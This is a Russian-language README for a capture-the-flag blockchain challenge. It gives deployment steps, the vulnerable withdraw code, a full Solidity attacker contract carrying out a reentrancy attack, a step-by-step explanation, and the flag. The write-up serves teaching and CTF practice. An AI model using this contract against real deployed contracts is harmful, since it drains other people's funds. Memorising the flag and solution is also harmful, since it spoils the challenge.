# Blockchain_marketplace | Hard | Misc

## Информация

> Нашёл вот такой магазинчик в даркнете, хочу что нибудь прикупить.
>

## Деплой

Нужно будет поднимать per instance для каждой команды. По другому не придумал (

```sh
cd deploy
docker-compose up --build -d
```

## Выдать участинкам

Архив из директории [public/](public/) и ссылку на поднятие per instance, где выдовать ip:port deployer'а

## Описание

Есть смарт-контракт (исходник дан участником) нужно обратить внимание на строчку
```solidity
require(balances[msg.sender] > 0, "Insufficient balance");
(bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
require(success, "Transfer failed");
balances[msg.sender] = 0;
emit Withdrawal(msg.sender);
```

классический пример ошибки и атаки на reentrancy attack. Нужно написать атакующий контракт залить в сеть и произвести атаку.

## Решение

Замечаем строчки 
```solidity
require(balances[msg.sender] > 0, "Insufficient balance");
(bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
require(success, "Transfer failed");
balances[msg.sender] = 0;
emit Withdrawal(msg.sender);
```

понимаем что сначала происходит операция передачи эфира, а только потом уменьшение в памяти смарт контракта.

Пример атакующего контракта

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

interface IMarketplace {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IMarketplace public marketplace;
    uint256 public callCount;
    uint256 public constant MAX_CALLS = 100;

    constructor(IMarketplace _marketplace) {
        marketplace = _marketplace;
    }

    receive() external payable {
        if (address(marketplace).balance >= 1 ether && callCount < MAX_CALLS) {
            callCount++;
            marketplace.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required");
        marketplace.deposit{value: msg.value - 50000}();
        callCount = 0;
        marketplace.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
MAX_CALLS указывается чтобы долго не ждать пока пройдёт транзакция.

Что происходит:
1. Отправляется на депозит любая сумма эфира
2. Вызывается функция withdraw() чтобы вернуть свои средства
3. На уязвимом контракте вызывается функция transfer которая вызывает receive на атакующем контракте
4. receive вызывает функцию withdraw что и создаёт рекурсию
5. Проиходит списание эфира, пока на контракте > 1 ether либо количество вызовов < MAX_CALLS

[Эксплоит](solve/exploit/exploit.js)

## Флаг

`cuctf{3xpl01t3d_Re3ntrancy_Attack}`
